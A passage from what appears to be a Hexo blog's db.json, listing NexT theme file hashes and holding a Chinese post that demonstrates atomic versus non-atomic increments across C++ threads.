3844769535},{"_id":"themes/next/source/lib/jquery_lazyload/bower.json","hash":"65bc85d12197e71c40a55c0cd7f6823995a05222","modified":1483844769535},{"_id":"themes/next/source/lib/jquery_lazyload/jquery.lazyload.js","hash":"481fd478650e12b67c201a0ea41e92743f8b45a3","modified":1483844769535},{"_id":"themes/next/source/lib/jquery_lazyload/jquery.scrollstop.js","hash":"0e9a81785a011c98be5ea821a8ed7d411818cfd1","modified":1483844769535},{"_id":"themes/next/source/lib/velocity/.bower.json","hash":"05f960846f1c7a93dab1d3f9a1121e86812e8c88","modified":1483844769535},{"_id":"themes/next/source/lib/velocity/bower.json","hash":"2ec99573e84c7117368beccb9e94b6bf35d2db03","modified":1483844769535},{"_id":"themes/next/source/lib/velocity/velocity.min.js","hash":"2f1afadc12e4cf59ef3b405308d21baa97e739c6","modified":1483844769535},{"_id":"themes/next/source/lib/velocity/velocity.ui.js","hash":"6a1d101eab3de87527bb54fcc8c7b36b79d8f0df","modified":1483844769539},{"_id":"themes/next/source/lib/velocity/velocity.ui.min.js","hash":"ed5e534cd680a25d8d14429af824f38a2c7d9908","modified":1483844769539},{"_id":"themes/next/source/lib/jquery/index.js","hash":"41b4bfbaa96be6d1440db6e78004ade1c134e276","modified":1483844769535},{"_id":"themes/next/.git/logs/refs/heads/master","hash":"cf83590ac71b1d2b9505fa2249b0ba05d855a65e","modified":1483844769487},{"_id":"themes/next/.git/refs/remotes/origin/HEAD","hash":"d9427cda09aba1cdde5c69c2b13c905bddb0bc51","modified":1483844769487},{"_id":"themes/next/layout/_scripts/third-party/analytics/application-insights.swig","hash":"60426bf73f8a89ba61fb1be2df3ad5398e32c4ef","modified":1483844769515},{"_id":"themes/next/layout/_scripts/third-party/analytics/baidu-analytics.swig","hash":"deda6a814ed48debc694c4e0c466f06c127163d0","modified":1483844769515},{"_id":"themes/next/layout/_scripts/third-party/analytics/busuanzi-counter.swig","hash":"4fcbf57c4918528ab51d3d042cff92cf5aefb599","modified":1483844769515},{"_id":"themes/next/layout/_scripts/third-party/analytics/cnzz-analytics.swig","hash":"8160b27bee0aa372c7dc7c8476c05bae57f58d0f","modified":1483844769515},{"_id":"themes/next/layout/_scripts/third-party/analytics/facebook-sdk.swig","hash":"394d008e5e94575280407ad8a1607a028026cbc3","modified":1483844769515},{"_id":"themes/next/layout/_scripts/third-party/analytics/google-analytics.swig","hash":"30a23fa7e816496fdec0e932aa42e2d13098a9c2","modified":1483844769515},{"_id":"themes/next/layout/_scripts/third-party/analytics/tencent-analytics.swig","hash":"3658414379e0e8a34c45c40feadc3edc8dc55f88","modified":1483844769515},{"_id":"themes/next/layout/_scripts/third-party/comments/disqus.swig","hash":"fb1d04ede838b52ca7541973f86c3810f1ad396e","modified":1483844769515},{"_id":"themes/next/layout/_scripts/third-party/comments/duoshuo.swig","hash":"a356b2185d40914447fde817eb3d358ab6b3e4c3","modified":1483844769515},{"_id":"themes/next/layout/_scripts/third-party/comments/gentie.swig","hash":"03592d1d731592103a41ebb87437fe4b0a4c78ca","modified":1483844769515},{"_id":"themes/next/layout/_scripts/third-party/comments/hypercomments.swig","hash":"3e8dc5c6c912628a37e3b5f886bec7b2e5ed14ea","modified":1483844769515},{"_id":"themes/next/layout/_scripts/third-party/comments/youyan.swig","hash":"ea8078fa9e10be2bb042749d8b6a97adc38f914c","modified":1483844769515},{"_id":"themes/next/source/css/_common/components/back-to-top.styl","hash":"b49efc66bd055a2d0be7deabfcb02ee72a9a28c8","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/buttons.styl","hash":"0dfb4b3ba3180d7285e66f270e1d3fa0f132c3d2","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/comments.styl","hash":"471f1627891aca5c0e1973e09fbcb01e1510d193","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/components.styl","hash":"10994990d6e0b4d965a728a22cf7f6ee29cae9f6","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/pagination.styl","hash":"711c8830886619d4f4a0598b0cde5499dce50c62","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/tag-cloud.styl","hash":"dd8a3b22fc2f222ac6e6c05bd8a773fb039169c0","modified":1483844769519},{"_id":"themes/next/source/css/_common/outline/outline.styl","hash":"2186be20e317505cd31886f1291429cc21f76703","modified":1483844769519},{"_id":"themes/next/source/css/_common/scaffolding/base.styl","hash":"5304f99581da3a31de3ecec959b7adf9002fde83","modified":1483844769519},{"_id":"themes/next/source/css/_common/scaffolding/helpers.styl","hash":"54c90cf7bdbf5c596179d8dae6e671bad1292662","modified":1483844769519},{"_id":"themes/next/source/css/_common/scaffolding/normalize.styl","hash":"ece571f38180febaf02ace8187ead8318a300ea7","modified":1483844769519},{"_id":"themes/next/source/css/_common/scaffolding/scaffolding.styl","hash":"013619c472c7e4b08311c464fcbe9fcf5edde603","modified":1483844769519},{"_id":"themes/next/source/css/_common/scaffolding/tables.styl","hash":"64f5d56c08d74a338813df1265580ca0cbf0190b","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Mist/_base.styl","hash":"c2d079788d6fc2e9a191ccdae94e50d55bf849dc","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Mist/_header.styl","hash":"5ae7906dc7c1d9468c7f4b4a6feddddc555797a1","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Mist/_logo.styl","hash":"38e5df90c8689a71c978fd83ba74af3d4e4e5386","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Mist/_menu.styl","hash":"b0dcca862cd0cc6e732e33d975b476d744911742","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Mist/_posts-expanded.styl","hash":"fda14bc35be2e1b332809b55b3d07155a833dbf4","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Mist/_search.styl","hash":"1452cbe674cc1d008e1e9640eb4283841058fc64","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Mist/index.styl","hash":"9a5581a770af8964064fef7afd3e16963e45547f","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Muse/_layout.styl","hash":"0efa036a15c18f5abb058b7c0fad1dd9ac5eed4c","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Muse/_logo.styl","hash":"8829bc556ca38bfec4add4f15a2f028092ac6d46","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Muse/_menu.styl","hash":"82bbaa6322764779a1ac2e2c8390ce901c7972e2","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Muse/_search.styl","hash":"1452cbe674cc1d008e1e9640eb4283841058fc64","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Muse/index.styl","hash":"a0e2030a606c934fb2c5c7373aaae04a1caac4c5","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Pisces/_brand.styl","hash":"ff9f163bb05c0709577040a875924d36c9ab99d6","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Pisces/_layout.styl","hash":"d79073535dbb31d952f0c139dfca55aca78f69e7","modified":1483846634449},{"_id":"themes/next/source/css/_schemes/Pisces/_menu.styl","hash":"1408209dfb9a22a0982a30bdbd14842c2b53f264","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Pisces/_posts.styl","hash":"2f878213cb24c5ddc18877f6d15ec5c5f57745ac","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Pisces/_sidebar.styl","hash":"9b63bd8effc7cf4b96acdea4d73add7df934a222","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Pisces/index.styl","hash":"69ecd6c97e7cdfd822ac8102b45ad0ede85050db","modified":1483844769519},{"_id":"themes/next/source/js/src/schemes/pisces.js","hash":"9ccee9189c910b8a264802d7b2ec305d12dedcd0","modified":1483844769523},{"_id":"themes/next/source/lib/fancybox/source/blank.gif","hash":"2daeaa8b5f19f0bc209d976c02bd6acb51b00b0a","modified":1483844769527},{"_id":"themes/next/source/lib/fancybox/source/fancybox_loading.gif","hash":"1a755fb2599f3a313cc6cfdb14df043f8c14a99c","modified":1483844769527},{"_id":"themes/next/source/lib/fancybox/source/fancybox_loading@2x.gif","hash":"273b123496a42ba45c3416adb027cd99745058b0","modified":1483844769527},{"_id":"themes/next/source/lib/fancybox/source/fancybox_overlay.png","hash":"b3a4ee645ba494f52840ef8412015ba0f465dbe0","modified":1483844769527},{"_id":"themes/next/source/lib/fancybox/source/fancybox_sprite.png","hash":"17df19f97628e77be09c352bf27425faea248251","modified":1483844769527},{"_id":"themes/next/source/lib/fancybox/source/fancybox_sprite@2x.png","hash":"30c58913f327e28f466a00f4c1ac8001b560aed8","modified":1483844769527},{"_id":"themes/next/source/lib/fancybox/source/jquery.fancybox.css","hash":"5f163444617b6cf267342f06ac166a237bb62df9","modified":1483844769527},{"_id":"themes/next/source/lib/fancybox/source/jquery.fancybox.js","hash":"1cf3d47b5ccb7cb6e9019c64f2a88d03a64853e4","modified":1483844769527},{"_id":"themes/next/source/lib/fancybox/source/jquery.fancybox.pack.js","hash":"53360764b429c212f424399384417ccc233bb3be","modified":1483844769527},{"_id":"themes/next/source/lib/fastclick/lib/fastclick.js","hash":"06cef196733a710e77ad7e386ced6963f092dc55","modified":1483844769527},{"_id":"themes/next/source/lib/fastclick/lib/fastclick.min.js","hash":"2cae0f5a6c5d6f3cb993015e6863f9483fc4de18","modified":1483844769527},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.css","hash":"4eda182cbcc046dbf449aef97c02c230cf80a494","modified":1483844769527},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.css.map","hash":"0189d278706509412bac4745f96c83984e1d59f4","modified":1483844769527},{"_id":"themes/next/source/lib/font-awesome/css/font-awesome.min.css","hash":"fb5b49426dee7f1508500e698d1b3c6b04c8fcce","modified":1483844769527},{"_id":"themes/next/source/lib/ua-parser-js/dist/ua-parser.min.js","hash":"38628e75e4412cc6f11074e03e1c6d257aae495b","modified":1483844769535},{"_id":"themes/next/source/lib/ua-parser-js/dist/ua-parser.pack.js","hash":"214dad442a92d36af77ed0ca1d9092b16687f02f","modified":1483844769535},{"_id":"themes/next/.git/objects/pack/pack-6f37f309d511b98ccb9a3d920eacea421d676a4d.idx","hash":"2a8fbed15c1eb59834dcd5afd0c551f0d80d2feb","modified":1483844769411},{"_id":"themes/next/source/lib/font-awesome/fonts/FontAwesome.otf","hash":"1b22f17fdc38070de50e6d1ab3a32da71aa2d819","modified":1483844769527},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.eot","hash":"965ce8f688fedbeed504efd498bc9c1622d12362","modified":1483844769531},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.woff","hash":"6d7e6a5fc802b13694d8820fc0138037c0977d2e","modified":1483844769535},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.woff2","hash":"97e438cc545714309882fbceadbf344fcaddcec5","modified":1483844769535},{"_id":"themes/next/source/lib/velocity/velocity.js","hash":"9f08181baea0cc0e906703b7e5df9111b9ef3373","modified":1483844769535},{"_id":"themes/next/.git/logs/refs/remotes/origin/HEAD","hash":"cf83590ac71b1d2b9505fa2249b0ba05d855a65e","modified":1483844769487},{"_id":"themes/next/source/css/_common/components/footer/footer.styl","hash":"8994ffcce84deac0471532f270f97c44fea54dc0","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/header/header.styl","hash":"ae1ca14e51de67b07dba8f61ec79ee0e2e344574","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/header/headerband.styl","hash":"d27448f199fc2f9980b601bc22b87f08b5d64dd1","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/header/menu.styl","hash":"c890ce7fe933abad7baf39764a01894924854e92","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/header/site-meta.styl","hash":"6c00f6e0978f4d8f9a846a15579963728aaa6a17","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/header/site-nav.styl","hash":"49c2b2c14a1e7fcc810c6be4b632975d0204c281","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/highlight/diff.styl","hash":"96f32ea6c3265a3889e6abe57587f6e2a2a40dfb","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/highlight/highlight.styl","hash":"4b7f81e1006e7acee3d1c840ccba155239f830cc","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/highlight/theme.styl","hash":"b76387934fb6bb75212b23c1a194486892cc495e","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/pages/archive.styl","hash":"7778920dd105fa4de3a7ab206eeba30b1a7bac45","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/pages/categories.styl","hash":"4eff5b252d7b614e500fc7d52c97ce325e57d3ab","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/pages/pages.styl","hash":"2039590632bba3943c39319d80ef630af7928185","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/pages/post-detail.styl","hash":"9bf4362a4d0ae151ada84b219d39fbe5bb8c790e","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/pages/schedule.styl","hash":"a82afbb72d83ee394aedc7b37ac0008a9823b4f4","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/post/post-button.styl","hash":"fdfadbb4483043c7e0afd541ee9712389e633517","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/post/post-collapse.styl","hash":"8fae54591877a73dff0b29b2be2e8935e3c63575","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/post/post-eof.styl","hash":"2cdc094ecf907a02fce25ad4a607cd5c40da0f2b","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/post/post-expand.styl","hash":"bee9e8170ec10713b22efb2c1b02b8ad9c01e2db","modified":1484323468835},{"_id":"themes/next/source/css/_common/components/post/post-gallery.styl","hash":"387ce23bba52b22a586b2dfb4ec618fe1ffd3926","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/post/post-meta.styl","hash":"7f1aab694caf603809e33cff82beea84cd0128fd","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/post/post-nav.styl","hash":"c6dab7661a6b8c678b21b7eb273cef7100f970f6","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/post/post-reward.styl","hash":"e792c8dc41561c96d128e9b421187f1c3dc978a0","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/post/post-tags.styl","hash":"a352ae5b1f8857393bf770d2e638bf15f0c9585d","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/post/post-title.styl","hash":"963105a531403d7aad6d9e5e23e3bfabb8ec065a","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/post/post-type.styl","hash":"10251257aceecb117233c9554dcf8ecfef8e2104","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/post/post.styl","hash":"bfd806d0a9f21446a22df82ac02e37d0075cc3b5","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-author-links.styl","hash":"2e7ec9aaa3293941106b1bdd09055246aa3c3dc6","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-author.styl","hash":"920343e41c124221a17f050bbb989494d44f7a24","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-blogroll.styl","hash":"c44f6a553ec7ea5508f2054a13be33a62a15d3a9","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-feed-link.styl","hash":"9486ddd2cb255227db102d09a7df4cae0fabad72","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-nav.styl","hash":"45fa7193435a8eae9960267438750b4c9fa9587f","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-toc.styl","hash":"7690b9596ec3a49befbe529a5a2649abec0faf76","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar-toggle.styl","hash":"2d3abbc85b979a648e0e579e45f16a6eba49d1e7","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/sidebar/sidebar.styl","hash":"234facd038f144bd0fe09a31ed1357c5d74c517f","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/sidebar/site-state.styl","hash":"3623e7fa4324ec1307370f33d8f287a9e20a5578","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/tags/blockquote-center.styl","hash":"c2abe4d87148e23e15d49ee225bc650de60baf46","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/tags/full-image.styl","hash":"b8969e1654eec89a0fd10d88b337fee9cb03cd44","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/tags/group-pictures.styl","hash":"4851b981020c5cbc354a1af9b831a2dcb3cf9d39","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/tags/note.styl","hash":"74d0ba86f698165d13402670382a822c8736a556","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/tags/tags.styl","hash":"3eb73cee103b810fa56901577ecb9c9bb1793cff","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/third-party/algolia-search.styl","hash":"eba491ae624b4c843c8be4c94a044085dad4ba0f","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/third-party/baidushare.styl","hash":"93b08815c4d17e2b96fef8530ec1f1064dede6ef","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/third-party/busuanzi-counter.styl","hash":"b03f891883446f3a5548b7cc90d29c77e62f1053","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/third-party/duoshuo.styl","hash":"2340dd9b3202c61d73cc708b790fac5adddbfc7f","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/third-party/gentie.styl","hash":"586a3ec0f1015e7207cd6a2474362e068c341744","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/third-party/jiathis.styl","hash":"327b5f63d55ec26f7663185c1a778440588d9803","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/third-party/localsearch.styl","hash":"637c6b32c58ecf40041be6e911471cd82671919b","modified":1483844769519},{"_id":"themes/next/source/css/_common/components/third-party/third-party.styl","hash":"42348219db93a85d2ee23cb06cebd4d8ab121726","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Mist/outline/outline.styl","hash":"5dc4859c66305f871e56cba78f64bfe3bf1b5f01","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Mist/sidebar/sidebar-blogroll.styl","hash":"8b8e8cbce98a9296c8fd77f512ae85d945f65d40","modified":1483844769519},{"_id":"themes/next/source/css/_schemes/Muse/sidebar/sidebar-blogroll.styl","hash":"8b8e8cbce98a9296c8fd77f512ae85d945f65d40","modified":1483844769519},{"_id":"themes/next/source/lib/fancybox/source/helpers/fancybox_buttons.png","hash":"e385b139516c6813dcd64b8fc431c364ceafe5f3","modified":1483844769527},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-buttons.css","hash":"1a9d8e5c22b371fcc69d4dbbb823d9c39f04c0c8","modified":1483844769527},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-buttons.js","hash":"91e41741c2e93f732c82aaacec4cfc6e3f3ec876","modified":1483844769527},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-media.js","hash":"3bdf69ed2469e4fb57f5a95f17300eef891ff90d","modified":1483844769527},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-thumbs.css","hash":"4ac329c16a5277592fc12a37cca3d72ca4ec292f","modified":1483844769527},{"_id":"themes/next/source/lib/fancybox/source/helpers/jquery.fancybox-thumbs.js","hash":"53e194f4a72e649c04fb586dd57762b8c022800b","modified":1483844769527},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.ttf","hash":"61d8d967807ef12598d81582fa95b9f600c3ee01","modified":1483844769535},{"_id":"themes/next/source/lib/algolia-instant-search/instantsearch.min.js","hash":"9ccc6f8144f54e86df9a3fd33a18368d81cf3a4f","modified":1483844769527},{"_id":"themes/next/source/lib/font-awesome/fonts/fontawesome-webfont.svg","hash":"c0522272bbaef2acb3d341912754d6ea2d0ecfc0","modified":1483844769531},{"_id":"themes/next/.git/objects/pack/pack-6f37f309d511b98ccb9a3d920eacea421d676a4d.pack","hash":"d1261debe4d39e6456266a963e4c810b2e6c0c14","modified":1483844769407}],"Category":[{"name":"实践小demo","_id":"cixyddgqg00040dtq6pp2jih4"},{"name":"Linux内核","_id":"cixyddgr700080dtqraxkhbcs"},{"name":"MySQL","_id":"cixyddgre000c0dtqqng9ui53"}],"Data":[],"Page":[{"title":"","date":"2017-01-14T02:49:37.000Z","type":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: \ndate: 2017-01-14 10:49:37\ntype: \"categories\"\n---\n","updated":"2017-01-14T02:58:05.225Z","path":"categories/index.html","comments":1,"layout":"page","_id":"cixyddgq500010dtqt2334nfb","content":"","excerpt":"","more":""},{"title":"tags","date":"2017-01-14T02:46:33.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2017-01-14 10:46:33\ntype: \"tags\"\n---\n","updated":"2017-01-14T02:53:12.821Z","path":"tags/index.html","comments":1,"layout":"page","_id":"cixyddgqc00030dtqjfud9rsn","content":"","excerpt":"","more":""}],"Post":[{"title":"C实践小程序-原子和非原子++操作","date":"2017-01-11T15:28:28.000Z","_content":"## 概念\n处理器保证从系统内存当中读取或者写入一个字节是原子的，意思是当一个处理器读取一个字节时，其他处理器不能访问这个字节的内存地址。    \n\n## 处理器如何实现的原子操作？\nhttp://www.infoq.com/cn/articles/atomic-operation   \n处理器使用**总线锁**就是来解决这个问题的。   \n\n\n## 完整代码\n```cpp\n#include <thread>\n#include <atomic>\n#include <unistd.h>\n#include <stdio.h>\n#include <list>\n#include <vector>\n//原子++\nstd::atomic_int iCount(0);\n//非原子性++\nint iCnt;\n/**\n非原子加多线程下最后的结果不确定！！！\niCnt=4853200...\niCnt=9889662...\niCnt=10000000...\niCnt=10000000...\n*/\nvoid threadfun1(int k)\n{\n    for(int i=0;i<1000000;i++){\n\t\tiCnt++;\n\t}\n}\n\n/*原子++*/\nvoid threadfun_atomic(int k)\n{\n    for(int i=0;i<100000;i++){\n\t\tiCount++;\n\t}\n}\nint main()\n{\n    std::atomic_bool b;\n    std::vector<std::thread> lstThread;\n    for (int i = 0; i < 10; ++i)\n    {\n        lstThread.push_back(std::thread(threadfun1,i));\n\t\tlstThread[i].detach();\n    }\n    \n\tfor (int i = 0; i < 10; ++i)\n    {\n        std::thread th1(threadfun_atomic,i);\n\t\t//自己释放内存\n\t\t//http://www.cnblogs.com/bits/archive/2009/12/04/no_join_or_detach_memory_leak.html\n\t\tth1.detach();\n    }\n\tusleep(1000000);\n\tprintf(\"iCnt=%d,iCount=%d \\n\",iCnt,(int)iCount);\n\treturn 0;\n}\n\n```\n\n## 执行结果:\n```cpp\n\niCnt=10000000,iCount=1000000 \niCnt=8487677,iCount=1000000 \niCnt=8595552,iCount=1000000 \niCnt=7772070,iCount=1000000 \niCnt=7820366,iCount=1000000 \niCnt=4151170,iCount=1000000 \niCnt=9490318,iCount=1000000 \n```\n\n## 进一步思考\n- 无锁操作是什么\n\n## 参考资料\n- 原子操作 vs 非原子操作(http://blog.jobbole.com/54345/)\n- 聊聊并发（五）——原子操作的实现原理(http://www.infoq.com/cn/articles/atomic-operation)\n","source":"_posts/C实践小程序-原子和非原子-操作.md","raw":"---\ntitle: C实践小程序-原子和非原子++操作\ndate: 2017-01-11 23:28:28\ncategories: 实践小demo\n---\n## 概念\n处理器保证从系统内存当中读取或者写入一个字节是原子的，意思是当一个处理器读取一个字节时，其他处理器不能访问这个字节的内存地址。    \n\n## 处理器如何实现的原子操作？\nhttp://www.infoq.com/cn/articles/atomic-operation   \n处理器使用**总线锁**就是来解决这个问题的。   \n\n\n## 完整代码\n```cpp\n#include <thread>\n#include <atomic>\n#include <unistd.h>\n#include <stdio.h>\n#include <list>\n#include <vector>\n//原子++\nstd::atomic_int iCount(0);\n//非原子性++\nint iCnt;\n/**\n非原子加多线程下最后的结果不确定！！！\niCnt=4853200...\niCnt=9889662...\niCnt=10000000...\niCnt=10000000...\n*/\nvoid threadfun1(int k)\n{\n    for(int i=0;i<1000000;i++){\n\t\tiCnt++;\n\t}\n}\n\n/*原子++*/\nvoid threadfun_atomic(int k)\n{\n    for(int i=0;i<100000;i++){\n\t\tiCount++;\n\t}\n}\nint main()\n{\n    std::atomic_bool b;\n    std::vector<std::thread> lstThread;\n    for (int i = 0; i < 10; ++i)\n    {\n        lstThread.push_back(std::thread(threadfun1,i));\n\t\tlstThread[i].detach();\n    }\n    \n\tfor (int i = 0; i < 10; ++i)\n    {\n        std::thread th1(threadfun_atomic,i);\n\t\t//自己释放内存\n\t\t//http://www.cnblogs.com/bits/archive/2009/12/04/no_join_or_detach_memory_leak.html\n\t\tth1.detach();\n    }\n\tusleep(1000000);\n\tprintf(\"iCnt=%d,iCount=%d \\n\",iCnt,(int)iCount);\n\treturn 0;\n}\n\n```\n\n## 执行结果:\n```cpp\n\niCnt=10000000,iCount=1000000 \niCnt=8487677,iCount=1000000 \niCnt=8595552,iCount=1000000 \niCnt=7772070,iCount=1000000 \niCnt=7820366,iCount=1000000 \niCnt=4151170,iCount=1000000 \niCnt=9490318,iCount=1000000 \n```\n\n## 进一步思考\n- 无锁操作是什么\n\n## 参考资料\n- 原子操作 vs 非原子操作(http://blog.jobbole.com/54345/)\n- 聊聊并发（五）——原子操作的实现原理(http://www.infoq.com/cn/articles/atomic-operation)\n","slug":"C实践小程序-原子和非原子-操作","published":1,"updated":"2017-01-14T02:58:59.920Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cixyddgpv00000dtqizqj5uyo","content":"<h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><p>处理器保证从系统内存当中读取或者写入一个字节是原子的，意思是当一个处理器读取一个字节时，其他处理器不能访问这个字节的内存地址。    </p>\n<h2 id=\"处理器如何实现的原子操作？\"><a href=\"#处理器如何实现的原子操作？\" class=\"headerlink\" title=\"处理器如何实现的原子操作？\"></a>处理器如何实现的原子操作？</h2><p><a href=\"http://www.infoq.com/cn/articles/atomic-operation\" target=\"_blank\" rel=\"external\">http://www.infoq.com/cn/articles/atomic-operation</a><br>处理器使用<strong>总线锁</strong>就是来解决这个问题的。   </p>\n<h2 id=\"完整代码\"><a href=\"#完整代码\" class=\"headerlink\" title=\"完整代码\"></a>完整代码</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;thread&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;atomic&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;list&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"comment\">//原子++</span></div><div class=\"line\"><span class=\"built_in\">std</span>::<span class=\"function\"><span class=\"keyword\">atomic_int</span> <span class=\"title\">iCount</span><span class=\"params\">(<span class=\"number\">0</span>)</span></span>;</div><div class=\"line\"><span class=\"comment\">//非原子性++</span></div><div class=\"line\"><span class=\"keyword\">int</span> iCnt;</div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\">非原子加多线程下最后的结果不确定！！！</div><div class=\"line\">iCnt=4853200...</div><div class=\"line\">iCnt=9889662...</div><div class=\"line\">iCnt=10000000...</div><div class=\"line\">iCnt=10000000...</div><div class=\"line\">*/</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">threadfun1</span><span class=\"params\">(<span class=\"keyword\">int</span> k)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">1000000</span>;i++)&#123;</div><div class=\"line\">\t\tiCnt++;</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/*原子++*/</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">threadfun_atomic</span><span class=\"params\">(<span class=\"keyword\">int</span> k)</span></span></div><div class=\"line\">&#123;</div><div 